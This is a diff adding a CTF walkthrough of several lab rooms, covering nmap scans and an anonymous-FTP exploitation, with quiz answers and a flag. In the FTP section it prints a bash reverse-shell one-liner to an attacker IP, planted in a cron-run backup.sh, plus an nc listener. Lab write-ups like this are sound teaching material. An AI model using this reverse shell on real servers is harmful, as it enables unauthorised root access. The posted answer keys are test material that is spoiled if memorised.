@@ -215,11 +215,72 @@ In the zip file, we can view the wishlist.
 ## What's Under the Christmas Tree
 
 ```shell
+nmap -T4 -Pn 10.10.16.201
+#to ignore ICMP being used
+#to determine if host is up
+
+nmap -T4 -sV 10.10.16.201
+#for version fingerprinting
+
+nmap --script http-title -p 80 10.10.16.201
+#to determine http-title of webserver
+```
+
+```markdown
+1. When was Snort created? - 1998
+
+2. What are the port numbers of the three services running? - 80,2222,3389
+
+3. What is reported as the most likely distribution to be running? - Ubuntu
+
+4. Based on the "HTTP-TITLE" value of the webserver, what might be this website used for? - blog
 ```
 
 ## Anyone can be Santa
 
 ```shell
+ftp 10.10.202.128
+#anonymous login
+
+ls #shows all directories
+#only public is accessible
+
+cd public
+#shows two files
+
+get backup.sh
+
+get shoppinglist.txt
+
+quit
+
+#in our system, we can view both the files
+#now, we can reupload the backup.sh script by replacing it with malicious code
+#we can use one-liners for getting a reverse shell
+#bash -i >& /dev/tcp/10.17.48.136/4444 0>&1
+
+#setup a listener
+nc -nvlp 4444
+
+#login to ftp again
+ftp 10.10.202.128
+
+cd public
+
+put backup.sh
+#in a minute, we will get access as root
+#we have access now
+cat flag.txt
+```
+
+```markdown
+1. Name the directory on the FTP server that has data accessible by the 'anonymous' user? - public
+
+2. What script gets executed within this directory? - backup.sh
+
+3. What movie did Santa have on his Christmas shopping list? - The Polar Express
+
+4. Content of flag.txt? - THM{even_you_can_be_santa}
 ```
 
 ## Don't be sElfish
@@ -294,7 +355,20 @@ We can also use discovered emails and usernames to search through breached data 
 
 ## There's a Python in my stocking
 
-```shell
+```markdown
+This is a short introduction to Python.
+
+1. What's the output of True + True? - 2
+
+2. What's the database for installing other peoples libraries called? - PyPi
+
+3. What is the output of bool("False")? - True
+
+4. What library lets us download the HTML of a webpage? - requests
+
+5. What is the output of the given program? - [1, 2, 3, 6]
+
+6. What causes the previous task to output that? - Pass by Reference
 ```
 
 ## Help! Where is Santa
